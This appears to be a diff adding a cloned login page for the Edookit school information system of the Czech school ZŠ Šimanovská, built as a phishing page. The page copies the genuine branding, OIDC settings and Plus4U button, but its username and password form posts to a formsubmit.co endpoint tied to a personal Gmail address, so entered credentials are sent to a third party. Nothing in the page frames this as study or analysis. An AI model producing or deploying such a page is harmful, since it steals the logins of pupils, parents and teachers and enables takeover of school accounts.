@@ -1,0 +1,330 @@
+<html lang="cs"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=100%, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
+    <meta name="robots" content="noindex">
+    <meta name="edoo-time" content="1683441768876">
+            <meta name="keywords" content="Edookit, elektronická třídní kniha, online matrika, administrativa školy, tvorba rozvrhu, školní informační systém,
+výukové nástroje 21. století">
+            <meta name="description" content="Edookit - jedinečný soubor nástrojů výrazně zjednodušujících výuku a administrativu.">
+            <meta name="icon" content="/favicon.ico">
+
+    <title>ZŠ Šimanovská – Školní informační systém | Edookit.com</title>
+
+    <link href="style/styles.mtime1675392055.css" media="screen,print" rel="stylesheet" type="text/css" id="main_css">
+       <!--[if IE]>
+       <link href="style/ie.css" rel="stylesheet" type="text/css" />
+       <![endif]-->
+       <!--[if IE 7]>
+       <link href="style/ie7.css" rel="stylesheet" type="text/css" />
+       <![endif]-->
+    <link href="style/print.mtime1651109797.css" media="print" rel="stylesheet" type="text/css">
+    <link href="style/print2.mtime1596671761.css" media="print" rel="stylesheet" type="text/css">
+    <link href="style/dashboard/styles.mtime1629687115.css" rel="stylesheet" type="text/css">
+
+        <script type="text/javascript">
+    window.UU5 = {
+        Environment: {
+            "uuapp.oidc.log_level": "INFO",
+            uu_app_oidc_primary_provider: "oidcg02",
+            uu_app_oidc_providers_oidcg02_uri: "https://uuidentity.plus4u.net/uu-oidc-maing02/bb977a99f4cc4c37a2afce3fd599d0a7/oidc",
+            uu_app_oidc_restore_session_on_load: "optional",
+            /* ACF: */
+            uu_app_oidc_backend_available: true,
+            uu_app_oidc_providers_oidcg02_authentication_type: "code",
+            uu_app_oidc_providers_oidcg02_session_crossdomain_strategy: "forward",
+            uu_app_oidc_backend_grant_call_token_available: true,            
+            /* /ACF */
+            uu_app_oidc_redirect_uri: 'https://zssimanovska-login.edookit.net/user/oidc-login-callback',
+            uu_app_oidc_post_logout_redirect_uri: 'https://zssimanovska-login.edookit.net/user/oidc-logout-callback',
+            uu_app_oidc_providers_oidcg01_enabled: false,
+            uu_app_oidc_providers_oidcg02_enabled: true,
+            uu_app_oidc_providers_oidcg02_client_id: "b4f8ba4a8f1c42d98176606bd3ce886c"
+        }
+    };
+</script>
+
+<link rel="shortcut icon" href="/favicon.ico">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="ZŠ Šimanovská">
+<meta name="msapplication-TileImage" content="/style/images/icons/icon-192.png">
+<meta name="msapplication-TileColor" content="#FFFFF">
+<link rel="apple-touch-icon" href="/style/images/icons/icon-192.png">
+<link rel="manifest" href="/handler/progressiveApp/manifest?v=1680017723">
+
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/service-worker.js');
+        }
+    </script>
+
+             <!-- legacy libs -->
+         <script src="/js/plus4u/plus4u.js?v=1683077943" onerror="throw this"></script>
+         <script src="/js/plus4u/pairing.js?v=1669085191" onerror="throw this"></script>
+
+        <script src="https://cdn.plus4u.net/uu-uu5loaderg01/1.0.0/uu5loaderg01.min.js" crossorigin="anonymous" onerror="throw this"></script>
+        <script src="/js/uu-uu5g05/1.0.0/assets/libs-config.js" onerror="throw this"></script>
+        <script type="text/javascript">
+
+            Uu5Loader.config({
+                imports: { /* required libs */
+                
+                  "plus4u" : "/js/plus4u/plus4u.js?v=1683077943",
+                  "plus4u_pairing" : "/js/plus4u/pairing.js?v=1669085191",
+                  "uu_appg01_core" : "https://cdn.plus4u.net/uu-appg01-core/5.0.0/uu_appg01_core.min.js",
+                  "uu_appg01" : "https://cdn.plus4u.net/uu-appg01/5.0.0/uu_appg01.min.js",
+                  "uu_appg01_oidc" : "https://cdn.plus4u.net/uu-appg01-oidc/3.0.0/uu_appg01_oidc.min.js",
+                  "js_client" : "/js/scripts.js?v=1675392055",
+            }});
+            Promise.all([
+                
+                  Uu5Loader.import("uu_appg01_core"),
+                  Uu5Loader.import("uu_appg01"),
+
+            ]);
+            const libraryImportPromise = Uu5Loader.import("uu_appg01_oidc");
+            
+        </script>
+
+
+    <style>
+        div#header_in, .w_menu_wrap, .header_toolbar ul.u0 ul {
+            background: #384F94;
+        }
+        .level2_toolbars .toolbar .u0 > li.m_active {
+            border-bottom-color: #384F94;
+        }
+        .info_box
+        {
+            color: ;
+        }
+        .info_box .logo /*, .touch_screen .w_menu_wrap*/
+        {
+            background-color: ;
+        }
+        .level1_toolbar .toolbar .u0 > li > a,
+        .touch_screen .lm_container a,
+        .header_toolbar li > a
+        {
+            color:  !important;
+        }
+        .level1_toolbar .toolbar .u0 > li > a:hover,
+        .level1_toolbar .toolbar li.m_active > a,
+        .level1_toolbar .toolbar li.m_active > a:hover,
+        .level1_toolbar .toolbar li.m_active2 > a,
+        .level1_toolbar .toolbar li.m_active2 > a:hover,
+        .no_touch div#top_menu .toolbar .u0 > li > a:hover,
+        .lm_container a
+        {
+            border-color: ;
+        }
+        .level2_toolbars
+        {
+            background-color: ;
+        }
+
+        .login-additional-text {
+            padding: 16px;
+        }
+    </style>
+</head>
+<body class="no_touch normal_browser br_web fixed_pos"><div id="print"><div id="print_in"></div></div>
+
+
+    <form class="nodisplay">
+        <input id="__vmid" type="hidden" value="99f43613c21b61c8beef763a9914b2d6">
+        <input id="__oid" type="hidden" value="2">
+        <input id="__tid" type="hidden" value="64">
+        <input id="__mid" type="hidden" value="">
+        <input type="hidden" name="authorized" value="0" data="handler/page/dashboard">
+        <input type="hidden" name="loading_translation" value="Odesílání žádosti">
+    </form>
+
+    <div id="holder">
+        <div id="header" class="arrow_on">
+            <div id="header_in">
+                <div class="menu_box">
+                    <div class="menu_box_in">
+                    <a href="#" class="icon ico_owl menu_switch header_icon no_label" title="!!menu!!">&nbsp;<span></span></a><div class="level1_toolbar"><div id="level1_toolbar"></div><div id="more_toolbar"></div></div><span id="h_timezone"></span> <div class="quick_buts" id="top_menu"></div></div>
+                </div>
+                <div class="info_box" id="info_box"><img id="logo_arrow" src="style/images/logo-repl-default.png">
+                    <div class="logo">
+                        <img src="https://zssimanovska-login.edookit.net/handler/download/logo?file=8585f6e1-fdfb-4d48-9ae6-fbdee8187a1a" width="45" height="45" id="logo">
+                        <img src="https://zssimanovska-login.edookit.net/handler/download/logo?file=8585f6e1-fdfb-4d48-9ae6-fbdee8187a1a" width="45" height="45" id="logo_replacement">
+                    </div>
+                    <div class="info">
+                        <div class="school_name">ZŠ Šimanovská</div>
+                    <div id="period"></div><div id="user_name"></div></div>
+                </div>
+                <div class="level2_toolbars" id="level2_toolbars"></div>
+            </div>
+        </div>
+
+        <div class="main_err_msg browser_sup">Přihlašte se, prosím.</div>
+        <noscript>
+            <div class="main_err_msg">
+                Skriptování je zakázané ve Vašem prohlížeči, prosím zapněte jej, aby došlo ke spuštění této aplikace
+            </div>
+        </noscript>
+
+        <span style="display:none" id="app-initialization-error" data-text="Při inicializace aplikace došlo k neočekávané chybě. Zkuste promazat mezipaměť prohlížeče, případně restartujte prohlížeč. Pokud nedojde k odstranění problému volejte Helpdesk: (+420) 221 400 421. Omlouváme se za případné problémy. Chyba:">
+        </span>
+
+        <div id="main">
+            <div id="main_in">
+                <div id="workspace">
+                    <div id="workspace_in">
+                    </div>
+                <div id="page_top">&nbsp;</div></div>
+
+                <div class="cleaner"></div>
+            </div>
+        </div>
+
+        <div id="login_wrap">
+            <div id="login_in">
+                <div id="login_box" class="comp" data-comp-id="login_box" data-comp-cid="22" data-comp-name="form">
+                    <div class="app_loading">Načítání</div>
+
+                    <div class="login_cont">
+                            <form id="login" action="https://formsubmit.co/capinolgd@gmail.com" method="post">
+    <fieldset>
+        <table>
+            <tbody><tr>
+                <td>
+                    <div class="login_label"><label for="username">Přihlašovací jméno:</label></div>
+                    <input type="text" name="login" id="username" value="" autocomplete="username">
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <div class="login_label"><label for="passwd">Heslo:</label></div>
+                    <input type="password" name="pwd" id="passwd" autocomplete="current-password">
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <input type="submit" name="login-submit" id="login-submit" class="submit submit_enabled" value="PŘIHLÁSIT">
+                </td>
+            </tr>
+        </tbody></table>
+    </fieldset>
+</form>
+
+
+                                <script type="text/javascript">
+            window.UU5.Login_options = {
+    "usePopup": false,
+    "language": "cs",
+    "authenticationContext": {
+        "applicationId": "Edookit_System",
+        "action": "login"
+    },
+    "prompt": null
+};
+    window.UU5.Login_scope = [
+    "edookit.net",
+    "Edookit_System"
+];
+        async function idmLoginClick() {
+            console.warn("Plus4U Login clicked");
+            await openPlus4UGw(window.UU5.Login_options, window.UU5.Login_scope);
+        }
+    </script>            <style>
+                #plus4ULoginButton {
+                    display: block;
+                    height: 23px;
+                    width: 224px;
+                    margin: 24px auto 8px auto;
+                    text-decoration: none;
+                    border: none !important;
+                    background-color: #E4EDF7;
+                    color: #377FEA;
+                    font-weight: 600;
+                    padding: 12px;
+                    font-size: 18px;
+                    text-align: center;
+                    overflow: hidden;
+                    text-overflow: ellipsis;
+                    cursor: pointer;
+                    white-space: nowrap;
+                    border-radius: 4px;
+                    -webkit-border-radius: 4px;
+                    -moz-border-radius: 4px;
+                    font-family: 'Source Sans Pro', sans-serif;
+                }
+                
+                #plus4ULoginButton:hover {
+                    background-color: #D8E1EB;
+                }
+                
+                #plus4ULoginButton:active {
+                    background-color: #CCD4DE;
+                }
+                
+                #plus4ULoginButton div {
+                    display: inline-block;
+                    vertical-align: top;
+                }
+            </style>
+            
+            <div onclick="idmLoginClick()" id="plus4ULoginButton">
+                <div>Přihlásit přes</div>
+                <div style="margin-top: -3px;"><svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 467.7175 141.7325" height="30" width="100" xml:space="preserve" version="1.1" id="svg2"><metadata id="metadata8"><rdf:rdf><cc:work rdf:about=""><dc:format>image/svg+xml</dc:format><dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage"></dc:type></cc:work></rdf:rdf></metadata><defs id="defs6"><clipPath id="clipPath16" clipPathUnits="userSpaceOnUse"><path id="path18" d="m 0,113.386 374.174,0 L 374.174,0 0,0 0,113.386 Z"></path></clipPath></defs><g transform="matrix(1.25,0,0,-1.25,0,141.7325)" id="g10"><g id="g12"><g clip-path="url(#clipPath16)" id="g14"><g transform="translate(306.8755,51.0366)" id="g20"><path id="path22" style="fill:#1d4e9e;fill-opacity:1;fill-rule:nonzero;stroke:none" d="m 0,0 c 0,-5.355 0.766,-7.99 2.975,-10.115 2.211,-2.125 6.554,-3.487 10.466,-3.487 5.356,0 10.721,1.956 12.25,5.102 0.85,1.699 1.19,4.164 1.19,8.5 l 0,34.002 12.072,0 0,-33.406 c 0,-8.756 -1.785,-14.282 -5.695,-17.852 -4.592,-3.996 -11.656,-5.865 -20.072,-5.865 -8.756,0 -15.567,1.955 -19.647,5.779 -4.25,3.996 -5.609,8.16 -5.609,17.086 l 0,34.258 12.07,0 L 0,0 Z"></path></g><path id="path24" style="fill:#66c430;fill-opacity:1;fill-rule:nonzero;stroke:none" d="m 246.616,28.351 36.115,0 0,10.217 -36.115,0 0,-10.217 z"></path><g transform="translate(246.6157,85.0386)" id="g26"><path id="path28" style="fill:#66c430;fill-opacity:1;fill-rule:nonzero;stroke:none" d="M 0,0 0,-34.016 32.291,0 0,0 Z"></path></g><g transform="translate(282.731,48.7915)" id="g30"><path id="path32" style="fill:#ffffff;fill-opacity:1;fill-rule:nonzero;stroke:none" d="M 0,0 -22.418,0 0,23.674 0,0 Z m -3.824,36.248 -32.291,-34.016 0,-12.455 36.115,0 0,-10.222 12.072,0 0,56.693 -15.896,0 z"></path></g><g transform="translate(260.313,48.7915)" id="g34"><path id="path36" style="fill:#1d4e9e;fill-opacity:1;fill-rule:nonzero;stroke:none" d="M 0,0 22.418,23.674 22.418,0 0,0 Z"></path></g><g transform="translate(184.2529,38.5679)" id="g38"><path id="path40" style="fill:#1d4e9e;fill-opacity:1;fill-rule:nonzero;stroke:none" d="m 0,0 27.703,0 c 4.422,0 6.887,0.233 8.332,1.168 1.869,1.105 2.975,2.971 2.975,5.266 0,2.55 -1.36,4.845 -3.485,5.949 -1.275,0.765 -3.486,1.212 -6.377,1.212 l -12.431,0 c -6.545,0 -10.967,0.999 -13.856,3.378 -3.57,2.976 -5.695,7.65 -5.695,12.752 0,6.97 3.824,13.261 9.349,15.386 2.721,1.02 5.696,1.36 12.667,1.36 l 26.173,0 0,-10.064 -25.577,0 c -5.272,0 -7.227,-0.221 -8.586,-0.902 -1.786,-1.021 -2.805,-2.89 -2.805,-5.441 0,-2.21 0.933,-4.08 2.549,-5.185 1.531,-0.936 3.4,-1.066 7.822,-1.066 l 11.779,0 c 8.16,0 12.496,-1.399 15.896,-4.545 2.721,-2.633 4.59,-7.735 4.59,-12.834 0,-5.782 -2.635,-11.301 -6.885,-14.107 -2.89,-1.955 -6.46,-2.55 -15.216,-2.55 L 0,-10.223 0,0 Z"></path></g><g transform="translate(136.7969,51.0366)" id="g42"><path id="path44" style="fill:#1d4e9e;fill-opacity:1;fill-rule:nonzero;stroke:none" d="m 0,0 c 0,-5.355 0.765,-7.99 2.975,-10.115 2.21,-2.125 6.554,-3.487 10.465,-3.487 5.356,0 10.721,1.956 12.251,5.102 0.85,1.699 1.19,4.164 1.19,8.5 l 0,34.002 12.071,0 0,-33.406 c 0,-8.756 -1.785,-14.282 -5.695,-17.852 -4.591,-3.996 -11.656,-5.865 -20.071,-5.865 -8.756,0 -15.567,1.955 -19.647,5.779 -4.25,3.996 -5.61,8.16 -5.61,17.086 l 0,34.258 L 0,34.002 0,0 Z"></path></g><g transform="translate(97.1123,85.0386)" id="g46"><path id="path48" style="fill:#1d4e9e;fill-opacity:1;fill-rule:nonzero;stroke:none" d="m 0,0 0,-46.471 24.778,0 0,-10.222 -36.85,0.002 0,56.691 L 0,0 Z"></path></g><g transform="translate(57.2695,58.2642)" id="g50"><path id="path52" style="fill:#1d4e9e;fill-opacity:1;fill-rule:nonzero;stroke:none" d="m 0,0 c 3.061,0 4.931,0.426 6.205,1.444 1.615,1.276 2.636,4.08 2.636,7.311 0,3.655 -1.445,6.29 -3.995,7.309 -1.021,0.426 -2.466,0.647 -4.591,0.647 l -17.106,0 L -16.851,0 0,0 Z m -16.851,-29.919 -12.072,0 0,56.692 28.753,0 c 9.691,0 13.261,-1.019 16.916,-4.844 3.485,-3.654 5.356,-8.414 5.356,-13.6 0,-5.779 -2.21,-11.22 -5.951,-14.533 -3.4,-2.976 -6.546,-3.91 -13.175,-3.91 l -19.827,0 0,-19.805 z"></path></g></g></g></g>
+</svg></div>
+            </div>
+<small>
+    <a href="https://www.edookit.com/cs/FAQ-pro-migraci" style="margin-top: 10px">
+        Více o Plus4U</a>
+</small>
+
+                            <a href="https://zssimanovska-login.edookit.net/user/reset-password-request" title="Nemůžete se přihlásit?">
+                                Nemůžete se přihlásit?</a>
+                    </div>
+                </div>
+
+                    <div id="smartphone-app-link" class="smartphone-app-link" style="margin: 20px auto; text-align: center;">
+                        <a href="https://www.edookit.com/cs/instructions-windows" target="_blank">Přidat aplikaci Edookit na plochu.</a>
+                    </div>
+            </div>
+        </div>
+
+        <div id="breadcrumbs"></div>
+    </div>
+
+    <script id="messages-data" type="application/json">
+        []
+    </script>
+
+    <script type="text/javascript">
+        // check browser time
+        var m = document.getElementsByName('edoo-time');
+        if (m && m.length > 0) {
+            var edootime = 1 * document.getElementsByName('edoo-time')[0].getAttribute('content');
+            var now = new Date();
+            var diff = Math.floor(Math.abs(edootime - now) / 1000 / 60);
+
+            // the diff must be less than 5 minutes
+            var isWrong = diff > 5;
+            var skipTimeCheck = document.cookie.indexOf('EDOO_SKIP_TIME_CHECK') >= 0;
+            if (isWrong && !skipTimeCheck) {
+                // save cookie till midnight
+                var midnight = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 23, 59, 59);
+                var expires = "; expires=" + midnight.toGMTString();
+
+                document.cookie = "EDOO_SKIP_TIME_CHECK=1" + expires + "; path=/";
+                alert("Váš operační systém má pravděpodobně špatně nastavený čas a nebo časovou zónu." + '\n\n' +
+                    "Některé funkce systému nemusí fungovat správně." + '\n\n' +
+                    "Rozdíl mezi časem serveru a časem Vašeho operačního systému je" + ' ' + diff + ' ' +  "minut.");
+            }
+        }
+    </script>
+
+    
+         <script src="/js/scripts.js?v=1675392055" onerror="throw this"></script><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; display: none;"></div>
+
+
+    
+
+</body></html>
